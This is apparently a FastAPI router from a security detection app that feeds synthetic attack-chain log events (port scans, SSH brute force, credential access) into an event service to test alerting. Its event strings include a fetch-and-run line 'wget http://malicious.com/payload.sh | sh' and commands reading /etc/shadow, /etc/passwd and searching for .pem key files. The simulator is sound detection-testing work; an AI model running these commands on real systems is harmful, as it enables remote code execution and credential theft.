from fastapi import APIRouter, Depends, HTTPException

from sqlalchemy.orm import Session

from app.db.session import get_db
from app.models.database import Incident
from app.models.schemas import EventCreate
from app.services.event_service import EventService

from app.core.time import (
    utc_now,
    utc_iso,
)

from datetime import timedelta
import uuid
import asyncio


router = APIRouter()


# In-memory storage for simulation status.
simulation_status = {}


@router.post("/simulate/full-attack")
async def simulate_full_attack(
    target_ip: str = "10.10.10.10",
    attacker_ip: str = "10.10.10.50",
    db: Session = Depends(get_db),
):
    """Simulate a full attack chain from reconnaissance to execution."""

    simulation_id = str(uuid.uuid4())

    started_at = utc_now()

    simulation_status[simulation_id] = {
        "status": "running",
        "started_at": utc_iso(started_at),
        "timezone": "UTC",
        "display_timezone": "Asia/Kathmandu",
        "events_sent": 0,
        "alerts_created": 0,
        "incidents_created": 0,
        "stages_completed": [],
    }

    service = EventService(db)

    existing_simulation_incidents = (
        db.query(Incident)
        .filter(
            Incident.source_entities.contains([attacker_ip]),
            Incident.status.in_(
                [
                    "open",
                    "investigating",
                    "contained",
                ]
            ),
        )
        .all()
    )

    for incident in existing_simulation_incidents:
        incident.status = "resolved"

    if existing_simulation_incidents:
        db.commit()

    attack_chain = [

        # Phase 1: Reconnaissance - T1046
        {
            "stage": "Reconnaissance",
            "event_type": "port_scan",
            "raw_event": (
                f"Port scan detected from {attacker_ip}: "
                "TCP SYN probe on ports 22, 80, 443, 8080"
            ),
            "delay": 0,
        },
        {
            "stage": "Reconnaissance",
            "event_type": "port_scan",
            "raw_event": (
                f"Port scan detected from {attacker_ip}: "
                "TCP SYN probe on ports 21, 23, 25, 3306"
            ),
            "delay": 1,
        },
        {
            "stage": "Reconnaissance",
            "event_type": "port_scan",
            "raw_event": (
                f"Port scan detected from {attacker_ip}: "
                "TCP SYN sweep across boundary interfaces"
            ),
            "delay": 1,
        },

        # Phase 2: Credential Access - T1110
        {
            "stage": "Credential Access",
            "event_type": "ssh_failed_login",
            "raw_event": (
                f"Failed password for admin from {attacker_ip}"
            ),
            "delay": 2,
        },
        {
            "stage": "Credential Access",
            "event_type": "ssh_failed_login",
            "raw_event": (
                f"Failed password for admin from {attacker_ip}"
            ),
            "delay": 1,
        },
        {
            "stage": "Credential Access",
            "event_type": "ssh_failed_login",
            "raw_event": (
                f"Failed password for root from {attacker_ip}"
            ),
            "delay": 1,
        },
        {
            "stage": "Credential Access",
            "event_type": "ssh_failed_login",
            "raw_event": (
                f"Failed password for admin from {attacker_ip}"
            ),
            "delay": 1,
        },
        {
            "stage": "Credential Access",
            "event_type": "ssh_failed_login",
            "raw_event": (
                f"Failed password for admin from {attacker_ip}"
            ),
            "delay": 1,
        },

        # Phase 3: Initial Access - T1078
        {
            "stage": "Initial Access",
            "event_type": "ssh_success",
            "raw_event": (
                f"Accepted password for admin from {attacker_ip}"
            ),
            "delay": 2,
        },

        # Phase 4: Execution - T1059
        {
            "stage": "Execution",
            "event_type": "command_execution",
            "raw_event": (
                "wget http://malicious.com/payload.sh | sh"
            ),
            "delay": 2,
        },
    ]

    event_first_seen = None
    event_last_seen = None

    for event_data in attack_chain:

        await asyncio.sleep(event_data["delay"])

        # Database/service time: timezone-aware UTC.
        event_time = utc_now()

        if event_first_seen is None:
            event_first_seen = event_time

        event_last_seen = event_time

        event = EventCreate(
            timestamp=event_time,
            host="target-server",
            source_ip=attacker_ip,
            event_type=event_data["event_type"],
            username="admin",
            severity=(
                "low"
                if "failed" in event_data["raw_event"].lower()
                else "medium"
            ),
            raw_event=event_data["raw_event"],
            normalized_data={"synthetic": True, "telemetry_source": "simulator"},
        )

        result = await asyncio.to_thread(service.process_event, event)

        simulation_status[simulation_id]["events_sent"] += 1

        simulation_status[simulation_id]["alerts_created"] += (
            result["alerts_created"]
        )

        simulation_status[simulation_id]["incidents_created"] += (
            len(result["incidents"])
        )

        if (
            event_data["stage"]
            not in simulation_status[simulation_id]["stages_completed"]
        ):
            simulation_status[simulation_id][
                "stages_completed"
            ].append(event_data["stage"])

    completed_time = utc_now()

    simulation_status[simulation_id]["status"] = "completed"

    simulation_status[simulation_id]["completed_at"] = (
        utc_iso(completed_time)
    )

    simulation_status[simulation_id]["event_first_seen"] = (
        utc_iso(event_first_seen)
        if event_first_seen
        else None
    )

    simulation_status[simulation_id]["event_last_seen"] = (
        utc_iso(event_last_seen)
        if event_last_seen
        else None
    )

    return simulation_status[simulation_id]


@router.post("/simulate/port-scan")
def simulate_port_scan(
    attacker_ip: str = "10.10.10.50",
    target_host: str = "target-server",
    db: Session = Depends(get_db),
):
    """Simulate port scanning activity."""

    service = EventService(db)

    base_time = utc_now()

    for i in range(5):

        event = EventCreate(
            timestamp=base_time + timedelta(seconds=i),
            host=target_host,
            source_ip=attacker_ip,
            event_type="port_scan",
            username="scanner",
            severity="low",
            raw_event=(
                f"Port scan connection probe on port "
                f"{22 + i} from {attacker_ip}"
            ),
            normalized_data={"synthetic": True, "telemetry_source": "simulator"},
        )

        service.process_event(event)

    return {
        "status": "success",
        "message": "Port scan simulation complete",
    }


@router.post("/simulate/ssh-brute-force")
def simulate_ssh_brute_force(
    attacker_ip: str = "10.10.10.50",
    target_host: str = "target-server",
    db: Session = Depends(get_db),
):
    """Simulate SSH brute force attack."""

    service = EventService(db)

    base_time = utc_now()

    usernames = [
        "admin",
        "root",
        "user",
        "test",
        "backup",
    ]

    for i, username in enumerate(usernames):

        event = EventCreate(
            timestamp=base_time + timedelta(seconds=i),
            host=target_host,
            source_ip=attacker_ip,
            event_type="ssh_failed_login",
            username=username,
            severity="low",
            raw_event=(
                f"Failed password for {username} "
                f"from {attacker_ip}"
            ),
            normalized_data={"synthetic": True, "telemetry_source": "simulator"},
        )

        service.process_event(event)

    return {
        "status": "success",
        "message": "SSH brute force simulation complete",
    }


@router.post("/simulate/credential-access")
def simulate_credential_access(
    attacker_ip: str = "10.10.10.50",
    target_host: str = "target-server",
    db: Session = Depends(get_db),
):
    """Simulate credential access after successful login."""

    service = EventService(db)

    base_time = utc_now()

    events = [
        (
            "ssh_success",
            "Accepted password for admin from "
            + attacker_ip,
        ),
        (
            "command_execution",
            "cat /etc/shadow",
        ),
        (
            "command_execution",
            "cat /etc/passwd",
        ),
        (
            "command_execution",
            "find / -name '*.pem' 2>/dev/null",
        ),
    ]

    for i, (event_type, raw_event) in enumerate(events):

        event = EventCreate(
            timestamp=base_time + timedelta(seconds=i),
            host=target_host,
            source_ip=attacker_ip,
            event_type=event_type,
            username="admin",
            severity="medium",
            raw_event=raw_event,
            normalized_data={"synthetic": True, "telemetry_source": "simulator"},
        )

        service.process_event(event)

    return {
        "status": "success",
        "message": "Credential access simulation complete",
    }


@router.get("/simulate/status/{simulation_id}")
async def get_simulation_status(
    simulation_id: str,
):
    """Get status of a running simulation."""

    if simulation_id not in simulation_status:
        raise HTTPException(
            status_code=404,
            detail="Simulation not found",
        )

    return simulation_status[simulation_id]


@router.get("/simulate/scenarios")
async def list_scenarios():
    """List available attack scenarios."""

    return {
        "scenarios": [
            {
                "id": "full-attack",
                "name": "Full Attack Chain",
                "description": (
                    "Complete attack from reconnaissance "
                    "to command & control"
                ),
                "stages": [
                    "Reconnaissance",
                    "Credential Access",
                    "Initial Access",
                    "Execution",
                    "Privilege Escalation",
                    "Credential Access",
                    "Command & Control",
                ],
            },
            {
                "id": "port-scan",
                "name": "Port Scanning",
                "description": (
                    "Network reconnaissance via port scanning"
                ),
                "stages": [
                    "Reconnaissance"
                ],
            },
            {
                "id": "ssh-brute-force",
                "name": "SSH Brute Force",
                "description": (
                    "Credential access via SSH brute force"
                ),
                "stages": [
                    "Credential Access"
                ],
            },
            {
                "id": "credential-access",
                "name": "Credential Access",
                "description": (
                    "Accessing credential files "
                    "after compromise"
                ),
                "stages": [
                    "Initial Access",
                    "Credential Access",
                ],
            },
        ]
    }
